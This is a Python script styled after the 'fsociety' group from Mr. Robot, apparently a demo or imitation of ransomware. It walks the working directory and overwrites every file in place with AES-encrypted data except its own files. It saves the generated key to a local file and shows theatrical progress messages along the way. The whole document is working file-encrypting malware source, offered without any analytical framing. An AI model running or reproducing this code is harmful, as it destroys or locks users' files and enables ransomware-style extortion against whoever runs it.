import os
import time
import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from random import SystemRandom
from string import ascii_letters, digits, punctuation

START_DIR = os.getcwd()
SALT = 'fsociety'
CS = 64*1024

def encrypt(root, filename, key):
    if (('fuxsocy.py' not in filename) and ('fsociety_key.dat' not in filename) and ('fuxsocy_decrypt.py' not in filename)):
        file_path = os.path.join(root, filename)
        file_size = str(os.path.getsize(file_path)).zfill(16)
        iv = Random.new().read(16)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        try:
            with open(file_path, 'rb') as infile:
                data = infile.read()
            with open(file_path, 'wb') as outfile:
                outfile.write(file_size.encode('utf-8'))
                outfile.write(iv)
                i = 0
                while i < len(data):
                    chunk = data[i:i+CS]
                    if len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - (len(chunk) % 16))
                    outfile.write(encryptor.encrypt(chunk))
                    i += CS
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")

def recurse(directory, key):
    for root, dirs, files in os.walk(directory):
       
        relative_path = os.path.relpath(root, START_DIR)
        if relative_path == '.':
            print("Encrypting /")
        else:
        
            print(f"Encrypting /{relative_path.replace(os.sep, '/')}")
            time.sleep(0.5)
        for file in files:
            encrypt(root, file, key)

def gen_key(salt):
    print('Loading Source of Entropy')
    password = salt.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation)
                                  for _ in range(SystemRandom().randint(40, 160))))
                         for _ in range(SystemRandom().randint(80, 120)))
    update_progress(0.3)
    time.sleep(0.4)
    update_progress(0.6)
    time.sleep(0.2)
    update_progress(1)
    print()
    print('\nGenerating Keys')
    update_progress(0.3)
    hasher = SHA256.new(password.encode('utf-8'))
    time.sleep(0.6)
    update_progress(0.5)
    time.sleep(0.6)
    update_progress(1)
    print()
    print()
    with open('fsociety_key.dat', 'w') as f:
        f.write(password)
    return hasher.digest()

def update_progress(progress):
    barLength = 23
    status = ""
    if isinstance(progress, int):
        progress = float(progress)
    if progress >= 1:
        progress = 1
        status = "COMPLETE"
    block = int(round(barLength*progress))
    text = "\r{0}\t\t{1}".format("#"*block + " "*(barLength-block), status)
    sys.stdout.write(text)
    sys.stdout.flush()

def pwn():
    if os.name == 'nt':
        subprocess.call('cls', shell=True)
    else:
        subprocess.call('clear')

    print('Executing FuxSocy Encryptor')
    key = gen_key(SALT)
    print('Locating target files.')
    time.sleep(0.7)
    print('Beginning crypto operations')
    recurse(START_DIR, key)
    print('\nEncryption complete. Key saved as fsociety_key.dat.')
    del key
    exit(0)

if __name__ == '__main__':
    pwn()
